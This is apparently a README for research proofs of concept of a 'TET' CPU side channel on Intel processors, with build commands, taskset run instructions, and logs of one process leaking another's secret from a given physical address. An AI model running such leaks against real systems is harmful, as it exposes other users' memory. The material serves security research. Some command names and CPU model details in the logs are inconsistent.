# Pocs

## Channel

```shell
cd channel
make clean && make
./main.c.out
```

```shell
# tested on intel i7-7700, intel i7-6700 and intel i9-10980XE
# shell log
λ ~/Developer/res-ws/tet-side-channel/pocs/channel/ main* ./main.c.out
size: 0,         max_i: 6,       max_i_index: S
size: 1,         max_i: 53,      max_i_index: S
size: 2,         max_i: 59,      max_i_index: S
size: 3,         max_i: 23,      max_i_index: S
size: 4,         max_i: 10,      max_i_index: S
size: 5,         max_i: 27,      max_i_index: S
size: 6,         max_i: 6,       max_i_index: H
size: 7,         max_i: 6,       max_i_index: I
size: 8,         max_i: 10,      max_i_index: S
size: 9,         max_i: 16,      max_i_index: S
size: 10,        max_i: 19,      max_i_index: S
size: 11,        max_i: 11,      max_i_index: S
size: 12,        max_i: 12,      max_i_index: S
size: 13,        max_i: 33,      max_i_index: S
size: 14,        max_i: 94,      max_i_index: S
size: 15,        max_i: 24,      max_i_index: S
size: 16,        max_i: 42,      max_i_index: S
size: 17,        max_i: 8,       max_i_index: S
size: 18,        max_i: 4,       max_i_index: L
size: 19,        max_i: 5,       max_i_index: C
size: 20,        max_i: 6,       max_i_index: S
size: 21,        max_i: 19,      max_i_index: S
size: 22,        max_i: 15,      max_i_index: S
size: 23,        max_i: 6,       max_i_index: S
size: 24,        max_i: 19,      max_i_index: S
size: 25,        max_i: 196,     max_i_index: S
size: 26,        max_i: 335,     max_i_index: S
size: 27,        max_i: 26,      max_i_index: S
size: 28,        max_i: 42,      max_i_index: S
size: 29,        max_i: 19,      max_i_index: S
size: 30,        max_i: 33,      max_i_index: S
size: 31,        max_i: 6,       max_i_index: S
size: 32,        max_i: 7,       max_i_index: A
size: 33,        max_i: 4,       max_i_index: C
size: 34,        max_i: 21,      max_i_index: S
size: 35,        max_i: 17,      max_i_index: S
size: 36,        max_i: 10,      max_i_index: S
size: 37,        max_i: 5,       max_i_index: D
size: 38,        max_i: 6,       max_i_index: J
size: 39,        max_i: 5,       max_i_index: J
size: 40,        max_i: 19,      max_i_index: S
size: 41,        max_i: 13,      max_i_index: S
size: 42,        max_i: 9,       max_i_index: S
size: 43,        max_i: 6,       max_i_index: S
size: 44,        max_i: 6,       max_i_index: H
size: 45,        max_i: 7,       max_i_index: S
size: 46,        max_i: 30,      max_i_index: S
size: 47,        max_i: 6,       max_i_index: G
size: 48,        max_i: 286,     max_i_index: S
size: 49,        max_i: 48,      max_i_index: S
```

## Attack

```shell
cd attack
make clean && make
# at shell 0
sudo taskset -c 1 ./secret.c.out
# at shell 1
taskset -c 5 ./tet_time_demo.c.out [PHYSICAL_ADDRESS_OF_SECRET]
```

```shell
# tested on intel i7-7700 and intel i7-67000
# shell 0 log
λ ./pocs/attack/ main* sudo taskset -c 1 ./secret.c.out
[+] Secret: HELLOETET
[+] Physical address of secret: 0x466a5d0b
[+] Exit with Ctrl+C if you are done reading the secret

# shell 1 log
λ ./pocs/attack/ main* taskset -c 5 ./tet_time_system.c.out 0x466a5d0b
size: 0
         max_i: 511
         max_i_index: H
size: 1
         max_i: 477
         max_i_index: E
size: 2
         max_i: 524
         max_i_index: L
size: 3
         max_i: 568
         max_i_index: L
size: 4
         max_i: 509
         max_i_index: O
size: 5
         max_i: 453
         max_i_index: G
size: 6
         max_i: 508
         max_i_index: F
size: 7
         max_i: 473
         max_i_index: L
size: 8
         max_i: 536
         max_i_index: A
size: 9
         max_i: 490
         max_i_index: G
```

## Others

```shell
λ ./pocs/channel/ main* screenfetch                    
                          ./+o+-       
                  yyyyy- -yyyyyy+      OS: Ubuntu 16.04 xenial
               ://+//////-yyyyyyo      Kernel: x86_64 Linux 4.15.0-142-generic
           .++ .:/++++++/-.+sss/`      Uptime: 6d 1h 9m
         .:++o:  /++++++++/:--:/-      Packages: 2037
        o:+o+:++.`..```.-/oo+++++/     Shell: zsh i
       .:+o:+o/.          `+sssoo+/    CPU: Intel Core i7-6700 CPU @ 4GHz
  .++/+:+oo+o:`             /sssooo.   RAM: 7272MiB / 7876MiB
 /+++//+:`oo+o               /::--:.  
 \+/+o+++`o++o               ++////.  
  .++.o+++oo+:`             /dddhhh.  
       .+.o+oo:.          `oddhhhh+   
        \+.++o+o``-````.:ohdhhhhh+    
         `:o+++ `ohhhhhhhhyo++os:     
           .o:`.syhhhhhhh/.oo++o`     
               /osyyyyyyo++ooo+++/    
                   ````` +oo+++o\:    
                          `oo++. 

λ ./pocs/channel/ main* gcc --version                  
gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

